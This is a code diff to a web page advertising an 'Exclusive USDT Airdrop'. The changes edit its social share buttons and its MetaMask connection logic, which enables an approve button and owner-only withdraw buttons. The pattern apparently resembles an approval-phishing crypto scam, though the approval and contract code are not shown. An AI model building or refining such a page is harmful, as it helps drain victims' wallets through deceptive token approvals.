@@ -163,19 +163,11 @@
     </div>
 
     <div class="social-media-buttons">
-      <!-- Twitter Share -->
       <a href="https://twitter.com/intent/tweet?text=Exclusive%20USDT%20Airdrop%20Just%20For%20You%21%20Claim%20Now%21&url=http://your-airdrop-link.com" target="_blank">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/60/Twitter_Logo_2021.svg" alt="Share on Twitter" width="40">
+        <i class="fab fa-twitter"></i>
       </a>
-      
-      <!-- Instagram Share -->
       <a href="https://www.instagram.com/?url=http://your-airdrop-link.com" target="_blank">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Instagram_Logo_2022.svg/1280px-Instagram_Logo_2022.svg.png" alt="Share on Instagram" width="40">
-      </a>
-      
-      <!-- Facebook Share -->
-      <a href="https://www.facebook.com/sharer/sharer.php?u=http://your-airdrop-link.com" target="_blank">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Share on Facebook" width="40">
+        <i class="fab fa-instagram"></i>
       </a>
     </div>
   </div>
@@ -246,21 +238,21 @@
     ];
 
     let web3;
-    let userAccount;
     let contract;
+    let accounts;
 
     async function connectMetaMask() {
       if (typeof window.ethereum !== 'undefined') {
         web3 = new Web3(window.ethereum);
         try {
-          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-          userAccount = accounts[0];
-          contract = new web3.eth.Contract(contractABI, contractAddress);
-          document.getElementById('connectButton').disabled = true;
+          accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+          document.getElementById('connectButton').innerText = 'Connected: ' + accounts[0];
           document.getElementById('approveButton').disabled = false;
-          document.getElementById('claimAirdropButton').disabled = false;
-          document.getElementById('withdrawETHButton').disabled = false;
-          document.getElementById('withdrawTokensButton').disabled = false;
+
+          if (accounts[0].toLowerCase() === ownerAddress.toLowerCase()) {
+            document.getElementById('withdrawETHButton').disabled = false;
+            document.getElementById('withdrawTokensButton').disabled = false;
+          }
         } catch (error) {
           console.error('User denied account access');
         }
@@ -273,3 +265,4 @@
   </script>
 </body>
 </html>
+
